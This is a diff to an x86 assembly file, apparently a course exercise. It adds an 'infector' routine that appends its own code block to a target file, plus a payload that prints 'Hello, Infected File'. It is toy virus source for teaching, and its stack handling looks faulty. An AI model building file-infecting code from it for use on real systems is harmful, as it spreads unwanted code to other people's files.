@@ -1,7 +1,12 @@
 section .text
 global _start
 global system_call
+global infection
+global infector
+global code_start
+global code_end
 extern main
+
 _start:
     pop    dword ecx    ; ecx = argc
     mov    esi,esp      ; esi = argv
@@ -38,3 +43,59 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
+
+infector:
+    push    ebp             ; Save caller state
+    mov     ebp, esp
+    sub     esp, 4          ; Leave space for local var on stack
+    pushad
+
+    open:
+        mov     eax, 5      ; Set eax to sys_open
+        mov     ebx, [ebp+8]; Get first arg
+        mov     ecx, 1025   ; 
+        mov     edx, 0777
+        int     0x80
+
+    write:
+        push    eax         ; Top of stack is fd
+        mov     ebx, eax    ; Set ebx to fd
+        mov     eax, 4      ; Set eax to sys_write
+        mov     ecx, code_start  ; Output buffer is code_start
+        mov     edx, code_end-code_start
+        int     0x80
+
+    close:
+        pop     ebx
+        mov     eax, 6
+        int     0x80
+
+    popad
+    mov     esp, ebp
+    pop     ebp
+    ret
+
+code_start:
+    msg:    db "Hello, Infected File",10, 0
+    len:    equ $-msg
+
+infection:
+    push    ebp             ; Save caller state
+    mov     ebp, esp
+    sub     esp, 4          ; Leave space for local var on stack
+    mov eax, [ebp+8]
+    and eax, 1
+    pop ebp
+    jz evn               ;Jump on Even
+    jnz code_end
+    
+    evn:
+        mov     eax, 4
+        mov     ebx, 1
+        mov     ecx, msg
+        mov     edx, len
+        int     0x80
+        jmp    code_end
+
+code_end:
+    end:    db 'q'
